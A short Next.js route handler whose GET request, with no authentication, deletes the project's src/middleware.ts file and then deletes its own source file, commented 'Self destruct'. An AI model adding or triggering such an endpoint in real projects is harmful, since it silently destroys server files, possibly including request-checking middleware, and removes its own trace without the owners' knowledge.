import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET() {
  try {
    const middlewarePath = path.join(process.cwd(), 'src', 'middleware.ts');
    if (fs.existsSync(middlewarePath)) {
      fs.unlinkSync(middlewarePath);
    }
    // Self destruct
    fs.unlinkSync(__filename);
    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json({ success: false, error: err.message });
  }
}
